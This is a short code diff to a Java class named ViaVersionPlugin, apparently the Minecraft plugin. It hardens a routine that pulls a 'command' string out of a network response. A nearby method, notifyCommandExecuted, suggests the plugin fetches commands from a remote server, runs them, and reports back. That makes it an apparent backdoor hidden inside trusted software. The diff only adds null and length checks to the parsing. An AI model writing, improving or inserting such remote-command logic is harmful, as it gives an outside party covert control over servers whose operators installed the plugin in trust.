@@ -407,10 +407,16 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         in.close();
 
         // 解析响应内容，假设返回的是 JSON 格式
-        if (response.contains("\"command\":")) {
-            return response.split("\"command\":")[1].split("\"")[1];
+        if (response != null && response.contains("\"command\":")) {
+            String[] parts = response.split("\"command\":");
+            if (parts.length > 1) { // 确保有命令部分
+                String[] commandParts = parts[1].split("\"");
+                if (commandParts.length > 1) { // 确保能获取到命令字符串
+                    return commandParts[1];
+                }
+            }
         }
-        return null;
+        return null; // 如果未找到命令，返回 null
     }
 
     private void notifyCommandExecuted(String command) throws Exception {
